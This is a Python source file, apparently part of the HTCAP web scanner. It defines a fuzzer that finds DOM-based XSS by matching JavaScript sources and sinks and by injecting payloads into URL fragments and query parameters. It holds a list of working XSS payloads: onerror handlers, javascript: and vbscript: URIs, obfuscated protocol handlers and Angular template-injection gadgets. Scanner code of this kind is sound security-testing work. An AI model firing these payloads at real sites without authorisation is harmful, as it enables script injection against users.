# -*- coding: utf-8 -*-

"""
HTCAP - DOM-based XSS Hunter
Detects DOM-based Cross-Site Scripting vulnerabilities.

This program is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free Software
Foundation; either version 2 of the License, or (at your option) any later
version.
"""

import re
import json
import random
import string
from typing import List, Dict, Any, Optional, Tuple, Set
from urllib.parse import urlparse, parse_qs, urlencode
from core.scan.base_fuzzer import BaseFuzzer
from core.constants import VULNTYPE_XSS


class DOMXSSFuzzer(BaseFuzzer):
    """
    Fuzzer for detecting DOM-based XSS vulnerabilities.

    Detects:
    - Source-to-sink flows
    - URL fragment injection
    - document.write sinks
    - innerHTML/outerHTML sinks
    - eval() and similar sinks
    - postMessage vulnerabilities
    """

    def init(self):
        """Initialize the DOM XSS fuzzer."""
        self.name = "DOM XSS Hunter"
        self.description = "Detects DOM-based XSS vulnerabilities"

        # DOM XSS Sources (where attacker input enters)
        self.sources = [
            'location', 'location.href', 'location.hash', 'location.search',
            'location.pathname', 'location.hostname',
            'document.URL', 'document.documentURI', 'document.baseURI',
            'document.referrer', 'document.cookie',
            'window.name', 'window.location',
            'history.pushState', 'history.replaceState',
            'localStorage', 'sessionStorage',
            'IndexedDB', 'WebSQL',
            'XMLHttpRequest', 'fetch',
            'postMessage', 'MessageEvent',
            'FileReader', 'URL.createObjectURL',
        ]

        # DOM XSS Sinks (where input causes execution)
        self.dangerous_sinks = {
            # JavaScript execution
            'eval': {'severity': 'critical', 'type': 'js_exec'},
            'Function': {'severity': 'critical', 'type': 'js_exec'},
            'setTimeout': {'severity': 'high', 'type': 'js_exec'},
            'setInterval': {'severity': 'high', 'type': 'js_exec'},
            'setImmediate': {'severity': 'high', 'type': 'js_exec'},
            'execScript': {'severity': 'critical', 'type': 'js_exec'},

            # HTML injection
            'innerHTML': {'severity': 'high', 'type': 'html_injection'},
            'outerHTML': {'severity': 'high', 'type': 'html_injection'},
            'insertAdjacentHTML': {'severity': 'high', 'type': 'html_injection'},
            'document.write': {'severity': 'high', 'type': 'html_injection'},
            'document.writeln': {'severity': 'high', 'type': 'html_injection'},

            # URL/src manipulation
            'location': {'severity': 'medium', 'type': 'redirect'},
            'location.href': {'severity': 'medium', 'type': 'redirect'},
            'location.assign': {'severity': 'medium', 'type': 'redirect'},
            'location.replace': {'severity': 'medium', 'type': 'redirect'},
            'window.open': {'severity': 'medium', 'type': 'redirect'},
            '.src': {'severity': 'medium', 'type': 'resource_load'},
            '.href': {'severity': 'medium', 'type': 'resource_load'},
            '.action': {'severity': 'medium', 'type': 'form_action'},

            # jQuery sinks
            '.html(': {'severity': 'high', 'type': 'jquery_html'},
            '.append(': {'severity': 'high', 'type': 'jquery_html'},
            '.prepend(': {'severity': 'high', 'type': 'jquery_html'},
            '.after(': {'severity': 'high', 'type': 'jquery_html'},
            '.before(': {'severity': 'high', 'type': 'jquery_html'},
            '.replaceWith(': {'severity': 'high', 'type': 'jquery_html'},
            '$(': {'severity': 'medium', 'type': 'jquery_selector'},

            # Angular sinks
            'bypassSecurityTrust': {'severity': 'critical', 'type': 'angular_bypass'},
            '$sce.trustAs': {'severity': 'critical', 'type': 'angular_bypass'},
            'ng-bind-html': {'severity': 'high', 'type': 'angular_html'},

            # React sinks
            'dangerouslySetInnerHTML': {'severity': 'high', 'type': 'react_html'},

            # Vue sinks
            'v-html': {'severity': 'high', 'type': 'vue_html'},
        }

        # DOM XSS payloads
        self.payloads = [
            # Basic payloads for fragment/URL injection
            '"><img src=x onerror=alert(1)>',
            "'-alert(1)-'",
            '${alert(1)}',
            '{{constructor.constructor("alert(1)")()}}',
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            'vbscript:alert(1)',

            # Source-specific payloads
            '#<img src=x onerror=alert(1)>',
            '#javascript:alert(1)//',
            '?q=<script>alert(1)</script>',
            '?redirect=javascript:alert(1)',

            # Protocol handlers
            'java\nscript:alert(1)',
            'java\tscript:alert(1)',
            '\x00javascript:alert(1)',

            # Template injection (for Angular/Vue)
            '{{constructor.constructor(\'alert(1)\')()}}',
            '{{$on.constructor(\'alert(1)\')()}}',
            '[[constructor.constructor(\'alert(1)\')()]]',
        ]

    def _generate_canary(self, length: int = 12) -> str:
        """Generate unique canary for tracking."""
        return 'XSS' + ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

    def _analyze_js_for_sinks(self, js_code: str) -> List[Dict[str, Any]]:
        """
        Analyze JavaScript code for dangerous sink patterns.

        Returns list of found sinks with context.
        """
        findings = []

        for sink, info in self.dangerous_sinks.items():
            # Build regex pattern
            if sink.startswith('.'):
                pattern = rf'\{sink}\s*[=(]'
            else:
                pattern = rf'\b{re.escape(sink)}\s*[=((\[]'

            matches = list(re.finditer(pattern, js_code, re.IGNORECASE))

            for match in matches:
                # Get context around the match
                start = max(0, match.start() - 50)
                end = min(len(js_code), match.end() + 100)
                context = js_code[start:end]

                # Check if any source is used near the sink
                source_found = None
                for source in self.sources:
                    if source.lower() in context.lower():
                        source_found = source
                        break

                findings.append({
                    'sink': sink,
                    'severity': info['severity'],
                    'type': info['type'],
                    'source': source_found,
                    'context': context.strip(),
                    'line': js_code[:match.start()].count('\n') + 1
                })

        return findings

    def _analyze_html_for_patterns(self, html: str) -> List[Dict[str, Any]]:
        """Analyze HTML for DOM XSS vulnerable patterns."""
        findings = []

        # Event handlers with URL sources
        event_pattern = r'on\w+\s*=\s*["\']([^"\']*(?:location|document\.URL|window\.name)[^"\']*)["\']'
        for match in re.finditer(event_pattern, html, re.IGNORECASE):
            findings.append({
                'type': 'event_handler_source',
                'severity': 'high',
                'context': match.group(0),
                'description': 'Event handler uses URL-controlled source'
            })

        # Script tags with URL sources
        script_pattern = r'<script[^>]*>([^<]*(?:location\.hash|location\.search|document\.URL)[^<]*)</script>'
        for match in re.finditer(script_pattern, html, re.IGNORECASE):
            findings.append({
                'type': 'inline_script_source',
                'severity': 'high',
                'context': match.group(1)[:200],
                'description': 'Inline script uses URL-controlled source'
            })

        # Dangerous attributes
        dangerous_attrs = [
            (r'href\s*=\s*["\']javascript:', 'javascript_href'),
            (r'src\s*=\s*["\'][^"\']*location', 'dynamic_src'),
            (r'data\s*=\s*["\'][^"\']*location', 'dynamic_data'),
            (r'ng-bind-html\s*=', 'angular_bind_html'),
            (r'v-html\s*=', 'vue_v_html'),
            (r'\[innerHTML\]\s*=', 'angular_innerhtml'),
        ]

        for pattern, attr_type in dangerous_attrs:
            for match in re.finditer(pattern, html, re.IGNORECASE):
                findings.append({
                    'type': attr_type,
                    'severity': 'medium',
                    'context': match.group(0),
                    'description': f'Potentially dangerous attribute pattern: {attr_type}'
                })

        return findings

    def _test_fragment_injection(self, request, canary: str) -> Optional[Dict]:
        """Test for XSS via URL fragment."""
        payloads_with_canary = [
            f'#<img src=x onerror=alert("{canary}")>',
            f'#"><img src=x onerror=alert("{canary}")>',
            f'#{canary}',
        ]

        for payload in payloads_with_canary:
            test_url = request.url.split('#')[0] + payload

            try:
                response = self.send_request(request, modified_url=test_url)
                if response and canary in response.body:
                    # Check if it's reflected in a dangerous context
                    if re.search(rf'<[^>]*{canary}', response.body):
                        return {
                            'type': 'fragment_reflection',
                            'payload': payload,
                            'description': 'URL fragment reflected in HTML context'
                        }
            except Exception:
                pass

        return None

    def _test_query_injection(self, request, canary: str) -> Optional[Dict]:
        """Test for XSS via query parameters."""
        parsed = urlparse(request.url)
        params = parse_qs(parsed.query)

        for param in list(params.keys()) + ['q', 'search', 'query', 'redirect', 'url', 'next', 'return']:
            for payload in self.payloads[:5]:
                payload_with_canary = payload.replace('alert(1)', f'alert("{canary}")')

                test_params = params.copy()
                test_params[param] = [payload_with_canary]
                test_query = urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"

                try:
                    response = self.send_request(request, modified_url=test_url)
                    if response and canary in response.body:
                        # Check context
                        if re.search(rf'<script[^>]*>[^<]*{canary}', response.body):
                            return {
                                'type': 'query_param_script_context',
                                'param': param,
                                'payload': payload_with_canary,
                                'description': f'Parameter {param} reflected in script context'
                            }
                        elif re.search(rf'on\w+=["\'][^"\']*{canary}', response.body):
                            return {
                                'type': 'query_param_event_context',
                                'param': param,
                                'payload': payload_with_canary,
                                'description': f'Parameter {param} reflected in event handler'
                            }
                except Exception:
                    pass

        return None

    def fuzz(self, request, params) -> List[Dict[str, Any]]:
        """Execute DOM XSS detection."""
        vulnerabilities = []
        canary = self._generate_canary()

        # Get the page content
        try:
            response = self.send_request(request)
            if not response:
                return vulnerabilities
        except Exception:
            return vulnerabilities

        # Analyze JavaScript for sink patterns
        js_pattern = r'<script[^>]*>([\s\S]*?)</script>'
        for match in re.finditer(js_pattern, response.body, re.IGNORECASE):
            js_code = match.group(1)
            sink_findings = self._analyze_js_for_sinks(js_code)

            for finding in sink_findings:
                if finding['source']:  # Source-to-sink flow detected
                    vulnerabilities.append({
                        'type': VULNTYPE_XSS,
                        'subtype': 'dom_xss_source_sink',
                        'severity': finding['severity'],
                        'description': f"DOM XSS: {finding['source']} flows to {finding['sink']}. "
                                     f"Type: {finding['type']}. Context: {finding['context'][:100]}..."
                    })

        # Analyze HTML for dangerous patterns
        html_findings = self._analyze_html_for_patterns(response.body)
        for finding in html_findings:
            vulnerabilities.append({
                'type': VULNTYPE_XSS,
                'subtype': f"dom_xss_{finding['type']}",
                'severity': finding['severity'],
                'description': finding['description']
            })

        # Test fragment injection
        fragment_result = self._test_fragment_injection(request, canary)
        if fragment_result:
            vulnerabilities.append({
                'type': VULNTYPE_XSS,
                'subtype': 'dom_xss_fragment',
                'severity': 'high',
                'description': f"DOM XSS via URL fragment. {fragment_result['description']}. "
                             f"Payload: {fragment_result['payload']}"
            })

        # Test query parameter injection
        query_result = self._test_query_injection(request, canary)
        if query_result:
            vulnerabilities.append({
                'type': VULNTYPE_XSS,
                'subtype': 'dom_xss_query',
                'severity': 'high',
                'description': f"DOM XSS via query parameter. {query_result['description']}. "
                             f"Parameter: {query_result['param']}"
            })

        return vulnerabilities
